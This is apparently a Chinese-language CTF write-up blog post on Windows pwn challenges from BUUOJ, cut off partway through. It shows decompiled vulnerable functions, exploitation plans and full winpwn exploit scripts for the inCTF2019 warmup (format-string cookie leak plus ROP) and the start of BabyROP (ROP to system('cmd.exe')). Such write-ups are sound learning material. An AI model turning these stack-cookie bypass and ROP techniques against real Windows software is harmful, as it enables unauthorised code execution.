<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="BUUOJ 刷题记录 -- Windows Pwn"><meta name="keywords" content="BUUOJ,pwn,warmup,BabyROP,BABYSHELLCODE,BABYSTACK,PWN9,BabyStack,Easywin,BabyHeap,Windows Land,LazyFragmentationHeap"><meta name="author" content="Nop"><meta name="copyright" content="Nop"><title>BUUOJ 刷题记录 -- Windows Pwn | Nop's Blog</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.7.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.7.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  }
} </script><meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Nop's Blog" type="application/atom+xml">
</head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Windows-inCTF2019-warmup"><span class="toc-number">1.</span> <span class="toc-text">[Windows][inCTF2019]warmup</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#题目分析"><span class="toc-number">1.1.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用思路"><span class="toc-number">1.2.</span> <span class="toc-text">利用思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">1.3.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Windows-Others-BabyROP"><span class="toc-number">2.</span> <span class="toc-text">[Windows][Others]BabyROP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#题目分析-1"><span class="toc-number">2.1.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用思路-1"><span class="toc-number">2.2.</span> <span class="toc-text">利用思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-1"><span class="toc-number">2.3.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Windows-HITBGSEC-BABYSHELLCODE"><span class="toc-number">3.</span> <span class="toc-text">[Windows][HITBGSEC]BABYSHELLCODE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#题目分析-2"><span class="toc-number">3.1.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SEH-Structured-Exception-Handling"><span class="toc-number">3.2.</span> <span class="toc-text">SEH (Structured Exception Handling)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用思路-2"><span class="toc-number">3.3.</span> <span class="toc-text">利用思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-2"><span class="toc-number">3.4.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Windows-HITBGSEC-BABYSTACK-amp-Windows-第五空间-2019-决赛-PWN9-amp-Windows-SUCTF-2019-BabyStack"><span class="toc-number">4.</span> <span class="toc-text">[Windows][HITBGSEC]BABYSTACK &amp; [Windows][第五空间 2019 决赛]PWN9 &amp; [Windows][SUCTF 2019]BabyStack</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#题目分析-3"><span class="toc-number">4.1.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SafeSEH"><span class="toc-number">4.2.</span> <span class="toc-text">SafeSEH</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用思路-3"><span class="toc-number">4.3.</span> <span class="toc-text">利用思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-3"><span class="toc-number">4.4.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Windows-Insomni’hack-Teaser-2017-Easywin"><span class="toc-number">5.</span> <span class="toc-text">[Windows][Insomni’hack Teaser 2017]Easywin</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#题目分析-4"><span class="toc-number">5.1.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows-CFG-Control-Flow-Gaurd"><span class="toc-number">5.2.</span> <span class="toc-text">Windows CFG(Control Flow Gaurd)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用思路-4"><span class="toc-number">5.3.</span> <span class="toc-text">利用思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-4"><span class="toc-number">5.4.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Windows-OGeek2019-BabyHeap-amp-Windows-ASIS-2017-Babyheap"><span class="toc-number">6.</span> <span class="toc-text">[Windows][OGeek2019]BabyHeap &amp; [Windows][ASIS 2017]Babyheap</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#题目分析-5"><span class="toc-number">6.1.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用思路-5"><span class="toc-number">6.2.</span> <span class="toc-text">利用思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-5"><span class="toc-number">6.3.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Windows-HITCON-2018-Windows-Land"><span class="toc-number">7.</span> <span class="toc-text">[Windows][HITCON 2018]Windows Land</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#题目分析-6"><span class="toc-number">7.1.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用思路-6"><span class="toc-number">7.2.</span> <span class="toc-text">利用思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-6"><span class="toc-number">7.3.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Windows-WCTF-2019-LazyFragmentationHeap"><span class="toc-number">8.</span> <span class="toc-text">[Windows][WCTF 2019]LazyFragmentationHeap</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#题目分析-7"><span class="toc-number">8.1.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用思路-7"><span class="toc-number">8.2.</span> <span class="toc-text">利用思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-7"><span class="toc-number">8.3.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考链接"><span class="toc-number">9.</span> <span class="toc-text">参考链接</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="https://n0nop.com/img/avatar.jpg"></div><div class="author-info__name text-center">Nop</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">34</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">7</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">6</span></a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://n0nop.com/img/background.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Nop's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a><a class="site-page" href="/about">About</a></span><span class="pull-right"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> Search</span></a></span></div><div id="post-info"><div id="post-title">BUUOJ 刷题记录 -- Windows Pwn</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-04-20</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/Writeup/">Writeup</a><div class="post-meta-wordcount"><span>Word count: </span><span class="word-count">13.2k</span><span class="post-meta__separator">|</span><span>Reading time: 62 min</span></div></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>本来去年暑假开始学习windows pwn，奈何需要备战考研所以搁置了，现在重新捡起来开始学习，记录一下BUUOJ上做的几个windows pwn题，总的来说windows pwn相对于linux pwn会略显复杂，机制更为繁琐，但是两者仍有一些共通之处。</p>
<p>此外，有关windows的一些保护机制以及绕过方式，将会结合题目一起提到而并不打算单独拎出来做总结。其实这方面的内容网上也有非常多的参考资料，整理得也相当好了，我也就不做过多得重复工作，遇到的时候再稍做记录效率会高一些。</p>
<a id="more"></a>

<h1 id="Windows-inCTF2019-warmup"><a href="#Windows-inCTF2019-warmup" class="headerlink" title="[Windows][inCTF2019]warmup"></a>[Windows][inCTF2019]warmup</h1><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>逻辑很简单，程序先是提供了一个格式化字符串漏洞：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fmt_str</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hHeap; <span class="comment">// [esp+0h] [ebp-2Ch]</span></span><br><span class="line">    <span class="keyword">void</span> *lpBuffer; <span class="comment">// [esp+4h] [ebp-28h]</span></span><br><span class="line">    <span class="keyword">char</span> fmt[<span class="number">24</span>]; <span class="comment">// [esp+8h] [ebp-24h] BYREF</span></span><br><span class="line">    <span class="keyword">int</span> v4; <span class="comment">// [esp+20h] [ebp-Ch]</span></span><br><span class="line">    __int16 v5; <span class="comment">// [esp+24h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>(fmt, <span class="string">"Tell me what you want :"</span>);</span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">    hHeap = GetProcessHeap();</span><br><span class="line">    lpBuffer = HeapAlloc(hHeap, <span class="number">8u</span>, <span class="number">0x150</span>u);</span><br><span class="line">    <span class="built_in">printf</span>(fmt);</span><br><span class="line">    ReadFile(<span class="built_in">stdin</span>, lpBuffer, <span class="number">0x150</span>u, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>((<span class="keyword">char</span> *)lpBuffer);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>后面直接给了个栈溢出：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> Buffer[<span class="number">64</span>]; <span class="comment">// [esp+0h] [ebp-44h] BYREF</span></span><br><span class="line"></span><br><span class="line">    init_buf();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Welcome ------ Banner\n"</span>);</span><br><span class="line">    j_fmt_str();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Did you make something out of it ??? :"</span>);</span><br><span class="line">    ReadFile(<span class="built_in">stdin</span>, Buffer, <span class="number">0x60</span>u, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此外还提供了一个后门，直接读flag：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">backdoor</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD NumberOfBytesWritten; <span class="comment">// [esp+0h] [ebp-30h] BYREF</span></span><br><span class="line">    HANDLE hFile; <span class="comment">// [esp+4h] [ebp-2Ch]</span></span><br><span class="line">    DWORD NumberOfBytesRead; <span class="comment">// [esp+8h] [ebp-28h] BYREF</span></span><br><span class="line">    <span class="keyword">char</span> Buffer[<span class="number">32</span>]; <span class="comment">// [esp+Ch] [ebp-24h] BYREF</span></span><br><span class="line"></span><br><span class="line">    hFile = CreateFileA(aFlag, <span class="number">0x80000000</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3u</span>, <span class="number">0x80</span>u, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">while</span> ( ReadFile(hFile, Buffer, <span class="number">0x20</span>u, &amp;NumberOfBytesRead, <span class="number">0</span>)</span><br><span class="line">        &amp;&amp; NumberOfBytesRead</span><br><span class="line">        &amp;&amp; WriteFile(<span class="built_in">stdout</span>, Buffer, NumberOfBytesRead, &amp;NumberOfBytesWritten, <span class="number">0</span>) )</span><br><span class="line">        ;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><ol>
<li>首先利用格式化字符串漏洞，读ebp，cookie和程序返回地址，从而得到程序加载的基地址。</li>
<li>由于栈溢出的字节数不够用，所以利用栈溢出劫持返回地址到<code>0x00406D3D</code>的位置： <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>00406D34                 <span class="keyword">push</span>    <span class="number">0</span>               <span class="comment">; lpOverlapped</span></span><br><span class="line"><span class="symbol">.text:</span>00406D36                 <span class="keyword">push</span>    <span class="number">0</span>               <span class="comment">; lpNumberOfBytesRead</span></span><br><span class="line"><span class="symbol">.text:</span>00406D38                 <span class="keyword">push</span>    <span class="number">60h</span> <span class="comment">; '`'       ; nNumberOfBytesToRead</span></span><br><span class="line"><span class="symbol">.text:</span>00406D3A                 <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+Buffer]</span><br><span class="line"><span class="symbol">.text:</span>00406D3D                 <span class="keyword">push</span>    <span class="built_in">eax</span>             <span class="comment">; lpBuffer</span></span><br><span class="line"><span class="symbol">.text:</span>00406D3E                 <span class="keyword">mov</span>     <span class="built_in">ecx</span>, stdin</span><br><span class="line"><span class="symbol">.text:</span>00406D44                 <span class="keyword">push</span>    <span class="built_in">ecx</span>             <span class="comment">; hFile</span></span><br><span class="line"><span class="symbol">.text:</span>00406D45                 <span class="keyword">call</span>    <span class="built_in">ds</span>:ReadFile</span><br></pre></td></tr></table></figure>
 这样，可以通过控制栈上传递给<code>ReadFile</code>的<code>lpOverlapped</code>、<code>lpNumberOfBytesRead</code>和<code>nNumberOfBytesToRead</code>（主要是这个）参数，实现再次栈溢出的效果，这样就可以读入一段更长的ROP。</li>
<li>但是由于远程环境中的flag是放在<code>flag.txt</code>里面的（简直坑爹），而后门里读的是/flag文件，显然直接跳到后门执行根本拿不到flag。</li>
<li>所以需要通过ROP把.data段上存放的”/flag”字符串给改成”./flag.txt”，再跳到后门执行即可。</li>
</ol>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> winpwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./warmup.exe"</span>)</span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">2</span> <span class="keyword">and</span> sys.argv[<span class="number">1</span>] == <span class="string">'1'</span>:</span><br><span class="line">    windbgx.attach(p)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = remote("node3.buuoj.cn", 26586)</span></span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x6C80</span></span><br><span class="line">stack_offset = <span class="number">12</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak GS and ebp</span></span><br><span class="line">payload = <span class="string">"%p "</span> * <span class="number">13</span></span><br><span class="line">p.sendlineafter(<span class="string">"Tell me what you want :"</span>, payload)</span><br><span class="line">res = p.recvline()</span><br><span class="line">PIE = int(res[<span class="number">-12</span>:<span class="number">-4</span>], <span class="number">16</span>) - <span class="number">0x6D27</span></span><br><span class="line">cookie = int(res[<span class="number">-30</span>:<span class="number">-22</span>], <span class="number">16</span>)</span><br><span class="line">ebp = int(res[<span class="number">-21</span>:<span class="number">-13</span>], <span class="number">16</span>)</span><br><span class="line">GS = cookie ^ (ebp - <span class="number">0x4C</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># read gadget to ReadFile return address</span></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">0x40</span> + p32(GS ^ ebp) <span class="comment"># cookie</span></span><br><span class="line">payload += p32(ebp) <span class="comment"># ebp</span></span><br><span class="line">payload += p32(PIE + <span class="number">0x6D3E</span>) <span class="comment"># return address (ReadFile)</span></span><br><span class="line">payload += p32(ebp) + p32(<span class="number">0x100</span>) + p32(<span class="number">0</span>) * <span class="number">2</span> <span class="comment"># args for ReadFile</span></span><br><span class="line">p.sendafter(<span class="string">"Did you make something out of it ??? :"</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># write gadget "pop ebp; ret" to return address of ReadFile to bypass canary check</span></span><br><span class="line"><span class="comment"># ------ NOTICE: __stdcall ------</span></span><br><span class="line"><span class="comment"># and write gadget to change string "./flag" on .data segment to "./flag.txt" and then return to backdoor</span></span><br><span class="line">payload = p32(PIE + <span class="number">0x6d59</span>) <span class="comment"># pop ebp; ret</span></span><br><span class="line">payload += <span class="string">"A"</span> * <span class="number">0x14</span> <span class="comment"># pop args</span></span><br><span class="line">payload += p32(ebp + <span class="number">0x34</span>)</span><br><span class="line">payload += p32(PIE + <span class="number">0x6D3E</span>) <span class="comment"># return address (ReadFile)</span></span><br><span class="line">payload += p32(PIE + <span class="number">0x6301C</span>) + p32(<span class="number">0x100</span>) + p32(<span class="number">0</span>) * <span class="number">2</span> <span class="comment"># args for ReadFile</span></span><br><span class="line">payload += p32(GS ^ (ebp + <span class="number">0x34</span>))</span><br><span class="line">payload += p32(<span class="number">0</span>) <span class="comment"># where ebp points to</span></span><br><span class="line">payload += p32(PIE + backdoor) <span class="comment"># return to backdoor</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># write "./flag.txt"</span></span><br><span class="line">payload = <span class="string">"./flag.txt\x00"</span></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"[*] cookie: %s"</span> % hex(cookie))</span><br><span class="line">print(<span class="string">"[*] ebp: %s"</span> % hex(ebp))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="Windows-Others-BabyROP"><a href="#Windows-Others-BabyROP" class="headerlink" title="[Windows][Others]BabyROP"></a>[Windows][Others]BabyROP</h1><h2 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h2><p>整个程序逻辑很简单，也没开GS保护：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *v3; <span class="comment">// eax</span></span><br><span class="line">    <span class="keyword">int</span> i; <span class="comment">// esi</span></span><br><span class="line">    <span class="keyword">char</span> v5; <span class="comment">// al</span></span><br><span class="line">    FILE *v6; <span class="comment">// eax</span></span><br><span class="line">    FILE *v7; <span class="comment">// eax</span></span><br><span class="line">    <span class="keyword">int</span> v8; <span class="comment">// esi</span></span><br><span class="line">    <span class="keyword">int</span> j; <span class="comment">// ebx</span></span><br><span class="line">    <span class="keyword">char</span> v10; <span class="comment">// al</span></span><br><span class="line">    FILE *v11; <span class="comment">// eax</span></span><br><span class="line">    <span class="keyword">char</span> v13[<span class="number">100</span>]; <span class="comment">// [esp+Ch] [ebp-CCh] BYREF</span></span><br><span class="line">    <span class="keyword">char</span> v14[<span class="number">100</span>]; <span class="comment">// [esp+70h] [ebp-68h] BYREF</span></span><br><span class="line">    <span class="keyword">int</span> v15; <span class="comment">// [esp+D4h] [ebp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"input your name"</span>);</span><br><span class="line">    v3 = _iob_func();</span><br><span class="line">    fflush(v3 + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">100</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">        v5 = getchar();</span><br><span class="line">        <span class="keyword">if</span> ( v5 == <span class="number">10</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        v14[i] = v5;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"hello %s\n"</span>, v14);</span><br><span class="line">    v6 = _iob_func();</span><br><span class="line">    fflush(v6 + <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"input your message length"</span>);</span><br><span class="line">    v7 = _iob_func();</span><br><span class="line">    fflush(v7 + <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d\n"</span>, &amp;v15);</span><br><span class="line">    v8 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( j = v15; v8 &lt; j; v13[v8++] = v10 )</span><br><span class="line">    &#123;</span><br><span class="line">        v10 = getchar();</span><br><span class="line">        <span class="keyword">if</span> ( v10 == <span class="number">10</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"leave your message"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"your mesage is %s\n"</span>, v13);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"press enter to exit\n"</span>);</span><br><span class="line">    v11 = _iob_func();</span><br><span class="line">    fflush(v11 + <span class="number">1</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先输入的name没有末尾补0，所以可以利用这个leak出栈上残留的数据。<br>其次后面直接给了一次栈溢出的机会。</p>
<h2 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h2><ol>
<li>name的buffer后偏移为0x64的地方存有MSVCR100.dll中函数的地址，利用这个将MSVCR100.dll的基地址算出来，并得到MSVCR100.dll中的<code>system</code>和”cmd.exe”的地址。</li>
<li>利用栈溢出直接劫持返回地址，布置ROP执行<code>system(&quot;cmd.exe&quot;)</code>。</li>
</ol>
<h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> winpwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./babyrop.exe"</span>)</span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">2</span> <span class="keyword">and</span> sys.argv[<span class="number">1</span>] == <span class="string">'1'</span>:</span><br><span class="line">    windbgx.attach(p)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = remote("node3.buuoj.cn", 29890) </span></span><br><span class="line"></span><br><span class="line">str_cmd_exe = <span class="number">0x1ED0</span></span><br><span class="line">system_offset = <span class="number">0x307FB</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak PIE</span></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">0x63</span> + <span class="string">"@"</span></span><br><span class="line">p.sendlineafter(<span class="string">"input your name"</span>, payload)</span><br><span class="line">p.recvuntil(<span class="string">"@"</span>)</span><br><span 